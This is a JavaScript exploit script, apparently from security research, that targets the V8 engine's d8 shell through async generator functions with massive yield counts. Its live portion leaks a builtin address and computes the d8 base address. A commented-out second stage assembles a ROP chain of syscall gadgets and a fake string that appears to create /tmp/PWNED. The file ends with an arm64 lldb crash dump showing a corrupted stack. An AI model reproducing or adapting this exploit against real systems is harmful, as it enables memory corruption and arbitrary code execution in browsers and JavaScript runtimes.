function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function p64(value, endianness = 'little') {
    const buf = new ArrayBuffer(8);
    new DataView(buf).setBigUint64(0, value, endianness === 'little');
    return String.fromCharCode(...new Uint8Array(buf));
}

let kNumYields1 = 427_463;

let Builtins_AsyncGeneratorPrototypeNext;
let d8_base;

let body1 = `
	let test1 = "foo";
	let b = 0x414141;
	let a = 0x41;
	${"a = 0x3fffffff;".repeat(22)}
	a = 0x0595ffff;
	a = 0x0595080b;
	a = 0x000495cf;
	${"a = 0x3fffffff;".repeat(42)}
	if (test1 == "bar") {
		Builtins_AsyncGeneratorPrototypeNext = b;
		${"yield* [b];".repeat(kNumYields1)}
	}
	test1 = "bar";
	try {
		{
			${"a = 1;".repeat(76)}
		}
		throw a;
	} catch (e) {
	}
`;

const AsyncGeneratorFunction1 = Object.getPrototypeOf(async function*(){}).constructor;
let bug1 = new AsyncGeneratorFunction1(body1);

let r1 = bug1();

//%DebugPrint(r);

//%SystemBreak();

r1.next(0x00);

Builtins_AsyncGeneratorPrototypeNext = BigInt(Builtins_AsyncGeneratorPrototypeNext) << 1n;
console.log(`[+] Builtins_AsyncGeneratorPrototypeNext = 0x${Builtins_AsyncGeneratorPrototypeNext.toString(16)}`);

d8_base = 0x0100000000n + BigInt(Builtins_AsyncGeneratorPrototypeNext) - 0x169029en;
console.log(`[+] d8_base = 0x${d8_base.toString(16)}`);


//let pop_rsi_offset = 0x015fca600;
//let pop_rdi = d8_base + 0x000b5015n;
//let pop_rdx = d8_base + 0x00068a4en;
//let pop_rax = d8_base + 0x0000bac5n;
//let syscall = d8_base + 0x000180dcn;
//// add rax, 0x150; pop rbp; ret;
//let add_rax = d8_base + 0x00212b80n;
//// push rsp; add al, byte ptr [rax]; mov eax, 0xffffffff; pop rbp; ret;
//let push_rsp_pop_rbp = d8_base + 0x00a6260cn;
//// mov rax, rbp; pop rbp; ret;
//let mov_rbp_rax = d8_base + 0x007ec494n;
//// mov rdi, rax; mov eax, dword ptr [rdi]; pop rbp; ret;
//let mov_rax_rdi = d8_base + 0x0196dc95n;
//
//
////let i = 2261634.5098039214;
////console.log("[+] [" + p64(0x4141414141414141n) + "]");
//
//function flatstr(s) { // %FlattenString(
//	return JSON.parse(JSON.stringify(s));
//}
//
//let world = flatstr("\x00\x01\x00\x00\x00" +
//											p64(0x0000000000000601n) +
//											p64(pop_rdx) +
//											p64(0x00000000000001a4n) +
//											p64(push_rsp_pop_rbp) +
//											p64(mov_rbp_rax) +
//											p64(0xdeadbeefdeadbeefn) +
//											p64(add_rax) +
//											p64(0xdeadbeefdeadbeefn) +
//											p64(mov_rax_rdi) + 
//											p64(0xdeadbeefdeadbeefn) +
//											p64(pop_rax) +
//											p64(0x0000000002000005n) +
//											p64(syscall) +
//											"A".repeat(0x108) +
//											"/tmp/PWNED\x00")
//let hello = flatstr(world + "A".repeat(pop_rsi_offset - world.length));
//
//let kNumYields2 = 445_100;
//
//let body2 = `
//	let test2 = "foo";
//	let a = 0x41;
//	${"a = 0x3fffffff;".repeat(50)}
//	a = 0x0595ffff;
//	a = 0x0595150b;
//	a = 0x0295231a;
//	a = 0x3fffffff;
//	a = 0x3fffffff;
//	${"a = 0x3fffffff;".repeat(12)}
//	if (test2 == "bar") {
//		${"yield* [41];".repeat(kNumYields2)}
//	}
//	test2 = "bar";
//	try {
//		{
//			${"a = 1;".repeat(75)}
//		}
//		throw a;
//	} catch (e) {
//	}
//`;
//
//const AsyncGeneratorFunction2 = Object.getPrototypeOf(async function*(){}).constructor;
//let bug2 = new AsyncGeneratorFunction2(body2);
//
//let r2 = bug2();
//
////%DebugPrint(r);
//
////%SystemBreak();
//
//r2.next(hello);



//
// Apparently arm64 requires sp to be 0xff aligned, so that's that.
//
// [ Legend: Modified register | Code | Heap | Stack | String ]
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
// x0     : 0x1ae6001ca025
// x1     : 0xb6
// x2     : 0x2
// x3     : 0x7d
// x4     : 0x8289
// x5     : 0x2
// x6     : 0x4e
// x7     : 0x106
// x8     : 0xf42aca5cde0c00aa
// x9     : 0xf42aca5cde0c00aa
// x10    : 0x1071db498    (libv8.dylib 0x161b498)  → <v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long)+7044>
// x11    : 0x6cb
// x12    : 0x0
// x13    : 0x0
// x14    : 0x7800
// x15    : 0x300000008
// x16    : 0x2
// x17    : 0x157ecc0c0
// x18    : 0x0
// x19    : 0x7d
// x20    : 0x20b300100071
// x21    : 0x101aaf4f0
// x22    : 0x1
// x23    : 0xd1
// x24    : 0x1ae600000011
// x25    : 0x1ae600000011
// x26    : 0x7dc614100
// x27    : 0x1ae60004b8a9
// x28    : 0x1ae600000000
// fp     : 0x1ae6001ca025
// lr     : 0x15772e740
// sp     : 0x1ae6001ca025
// pc     : 0x15772e744
// cpsr   : [N z c v q ssbs pan dit ge e a i f m]
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
// 0x1ae6001ca025│+0000: 0x65000007bd000540 ← $x0, $fp, $sp
// 0x1ae6001ca02d│+0008: 0x1d00000204001cb1
// 0x1ae6001ca035│+0010: 0x4100000028000009
// 0x1ae6001ca03d│+0018: 0x4141414141414141
// 0x1ae6001ca045│+0020: 0x4141414141414141
// 0x1ae6001ca04d│+0028: 0x4141414141414141
// 0x1ae6001ca055│+0030: 0x4141414141414141
// 0x1ae6001ca05d│+0038: 0x4141414141414141
// 0x1ae6001ca065│+0040: 0x4141414141414141
// 0x1ae6001ca06d│+0048: 0x4141414141414141
// 0x1ae6001ca075│+0050: 0x4141414141414141
// 0x1ae6001ca07d│+0058: 0x4141414141414141
// ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code ────
// None'?:
// 0x15772e744 <-18446744067947436219>: ldp       x29, x30, [sp], #0x10
// 0x15772e748 <-18446744067947436215>: ret
// 0x15772e74c <-18446744067947436211>: .long     0xcccccccc                         ; unknown opcode
// 0x15772e750 <-18446744067947436207>: .long     0xcccccccc                         ; unknown opcode
// 0x15772e754 <-18446744067947436203>: .long     0xcccccccc                         ; unknown opcode
// 0x15772e758 <-18446744067947436199>: .long     0xcccccccc                         ; unknown opcode
// 0x15772e75c <-18446744067947436195>: .long     0xcccccccc                         ; unknown opcode
// 0x15772e760 <-18446744067947436191>: mov       x16, #0x2c                         ; =44
// 0x15772e764 <-18446744067947436187>: stp       xzr, x16, [sp, #-0x20]!
// ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
// thread #1: tid = 13430473, 0x000000015772e744 `None + -18446744067947436219, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=259, address=0x1ae6001ca025)
// thread #2: tid = 13430505, 0x0000000183a164f8 libsystem_kernel.dylib`__psynch_cvwait + 8, name = 'V8 DefaultWorke'
// thread #3: tid = 13430506, 0x0000000183a164f8 libsystem_kernel.dylib`__psynch_cvwait + 8, name = 'V8 DefaultWorke'
// thread #4: tid = 13430507, 0x0000000183a164f8 libsystem_kernel.dylib`__psynch_cvwait + 8, name = 'V8 DefaultWorke'
// thread #5: tid = 13430508, 0x0000000183a164f8 libsystem_kernel.dylib`__psynch_cvwait + 8, name = 'V8 DefaultWorke'
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
// [#0]0x15772e744( 0x15782e744)   →  None()
// ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// Process 77184 stopped
// * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=259, address=0x1ae6001ca025)
//     frame #0: 0x000000015772e744
// Target 0: (d8) stopped.
// (lldb)
// d8 │ EXC_BAD_ACCESS (code=259, address=0x1ae6001ca025)
// 
